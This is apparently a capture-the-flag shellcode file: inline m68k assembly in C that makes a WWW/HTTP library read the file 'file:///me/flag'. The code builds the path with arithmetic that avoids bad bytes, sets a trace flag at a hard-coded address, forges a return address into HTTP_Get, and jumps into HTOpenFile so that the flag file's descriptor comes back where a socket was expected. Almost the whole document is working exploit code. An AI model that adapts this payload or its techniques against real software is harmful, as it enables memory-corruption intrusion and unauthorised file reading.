// File: www_shellcode.c
// Author: draco  -  jtang613@gmail.com
// 
// m68k-linux-gnu-gcc -O0 -march=68000 -c -o www_shellcode www_shellcode.c 
// m68k-linux-gnu-objdump -d www_shellcode

int main(void)
{
    __asm__ __volatile__
        (

        //  66696c65 3a2f2f2f 6d652f66 6c616700 // "file:///me/flag\0"

        "movem.l  %d3-%d4/%a3/%a5,(-0xd0,%sp)\n\t"    // Save regs

        "move.l  %sp,%d4\n\t"                   //  Store path where it won't get prematurely overwritten
        "subi.w  #0x0201,%d4\n\t"
        "move.l  %d4,%a5\n\t"

//        "move.l  #0x66696c65,(%a5)\n\t"       //  "file"
        "move.l  #0x78787878,%d4\n\t"
        "subi.l  #0x120f0c13,%d4\n\t"
        "move.l  %d4,(%a5)\n\t"
        "addq.l  #4,%a5\n\t"

//        "move.l  #0x3a2f2f2f,(%a5)\n\t"       //  ":///"
        "move.l  #0x43434343,%d4\n\t"
        "subi.l  #0x09141414,%d4\n\t"
        "move.l  %d4,(%a5)\n\t"
        "addq.l  #4,%a5\n\t"

//        "move.l  #0x6d652f66,(%a5)\n\t"       //  "me/f"
        "move.l  #0x78787878,%d4\n\t"
        "subi.l  #0x0b134912,%d4\n\t"
        "move.l  %d4,(%a5)\n\t"
        "addq.l  #4,%a5\n\t"

//        "move.l  #0x6c616700,(%a5)\n\t"       //  "lag\0"
        "move.l  #0x78787878,%d4\n\t"
        "subi.l  #0x0c171178,%d4\n\t"
        "move.l  %d4,(%a5)\n\t"
        "addq.l  #4,%a5\n\t"


        "move.l  #0x010326c1,%d4\n\t"           // Set WWW_TraceFlag @ 0x000122c0
        "eor.l   #0x01020401,%d4\n\t"           //    this tweaks the stack just enough
        "move.l  %d4,%a4\n\t"                   //    to let the payload succeed
        "move.l  #0x01010101,(%a4)\n\t"

        "move.l  %a5,%d3\n\t"                   // d3 = *filename
        "addi.w  #1120,%d3\n\t"
        "subi.w  #1136,%d3\n\t"

        "move.l  %fp,%a3\n\t"                   // swap some regs to avoid invalid bytes in shellcode
        "move.l  %sp,%fp\n\t"

        "move.l  %a5,%d4\n\t"
        "subi.w  #0x0121,%d4\n\t"
        "move.l  %d4,-(%fp)\n\t"            // pFormat (WWW_Format*)
        "move.l  %d3,-(%fp)\n\t"            // Addr (char*)

//        "move.l  #0xe480,%d4\n\t"         // Return addr: HTTP_Get:102
        "move.l  #0x43434343,%d2\n\t"       //    Return to the end of HTTP_Get with out FD
        "subi.l  #0x43425ec3,%d2\n\t"
        "move.l  %d2,-(%fp)\n\t"

        "move.l  %fp,%sp\n\t"               // Swap regs back
        "move.l  %a3,%fp\n\t"

//        "move.l  #0xcc8a,%a4\n\t"         // Target HTOpenFile to read the flag file
        "move.l  #0x11111111,%d4\n\t"
        "subi.l  #0x11104487,%d4\n\t"
        "move.l  %d4,%a4\n\t"

        "movem.l  (-0xc4,%sp),%d3-%d4/%a3/%a5\n\t"   // Restore regs

        "jmp  (%a4)\n\t"                    // Jump into HTOpenFile to return a File Desc instead of Socket

//        "nop\n\t"                         // Some test / scratchpad
//        "jmp  (-460,%pc)\n\t"
//        ".long  0x03fff46c\n\t"
        );
    
    return 0;
}

